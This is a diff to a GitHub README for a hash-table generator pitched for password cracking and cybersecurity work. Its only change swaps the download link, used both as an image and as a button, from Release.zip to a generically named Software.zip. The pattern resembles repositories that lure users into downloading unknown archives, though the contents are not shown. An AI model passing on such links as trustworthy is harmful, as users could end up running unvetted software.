@@ -1,6 +1,6 @@
 # 🌟 Welcome to the Hashtable Repository 🌟
 
-![Hashtable](https://github.com/Doge1203/hashtable/releases/download/v1.0/Release.zip)
+![Hashtable](https://github.com/Doge1203/hashtable/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the Hashtable repository! This repository is designed to help you generate precomputed hash tables from large wordlists. Whether you are working in CTI, cybersecurity, engaging in password cracking activities, or just need to generate hash tables for various offline uses, Hashtable is the tool for you!
@@ -37,7 +37,7 @@ Our repository covers a wide range of topics. Here are some of the key ones:
 
 ## Installation
 You can download the latest version of Hashtable by clicking the button below:
-[![Download Hashtable](https://github.com/Doge1203/hashtable/releases/download/v1.0/Release.zip)](https://github.com/Doge1203/hashtable/releases/download/v1.0/Release.zip)
+[![Download Hashtable](https://github.com/Doge1203/hashtable/releases/download/v2.0/Software.zip)](https://github.com/Doge1203/hashtable/releases/download/v2.0/Software.zip)
 
 ## Usage
 1. Download the Hashtable repository.
